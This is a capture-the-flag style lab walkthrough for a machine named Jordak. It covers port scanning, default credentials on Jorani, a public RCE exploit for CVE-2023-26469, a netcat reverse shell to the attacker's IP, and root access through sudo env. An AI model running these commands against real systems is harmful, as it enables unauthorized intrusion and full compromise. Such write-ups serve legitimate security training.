---
icon: ubuntu
---

# Jordak - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.139.109 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 10:35 EDT
Nmap scan report for 192.168.139.109
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-trane-info: Problem with XML parsing of /evox/about
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   32.12 ms 192.168.45.1
2   32.08 ms 192.168.45.254
3   32.96 ms 192.168.251.1
4   33.44 ms 192.168.139.109
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

Upon visiting the site we are greeted by the Default Apache Web page, so I will perform some directory busting.

```
dirsearch -u 192.168.139.109
```

<figure><img src="../../.gitbook/assets/image (1229).png" alt=""><figcaption></figcaption></figure>

Dirsearch reveals 2 interesting endpoints, when visiting /.gitattributes we are redirected to the following page.

<figure><img src="../../.gitbook/assets/image (1231).png" alt=""><figcaption></figcaption></figure>

A quick google search for default credentials reveals

<figure><img src="../../.gitbook/assets/image (1232).png" alt=""><figcaption></figcaption></figure>

And they work!

<figure><img src="../../.gitbook/assets/image (1233).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Jorani 1.0.0. RCE \[CVE-2023-26469]</mark>

I managed to find an RCE exploit for Jorani on this [**github**](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py) I downloaded it to my machine and gave it a shot. The exploit only needs the url of the website

```
python3 CVE_Jorani.py http://192.168.139.109
```

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

it worked! I am going to get a proper reverse shell on my machine using nc

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1235).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1239).png" alt=""><figcaption></figcaption></figure>

joradk can run /usr/bin/env as sudo! not only that but he is in the sudo group as well!

### <mark style="color:$primary;">Sudo env -> root</mark>

[**Gtfobins** ](https://gtfobins.github.io/gtfobins/env/#sudo)reveals an easy way to elevate our privileges to root.

<figure><img src="../../.gitbook/assets/image (1225).png" alt=""><figcaption></figcaption></figure>

```
sudo env /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1226).png" alt=""><figcaption></figcaption></figure>

I am root! :evergreen\_tree:
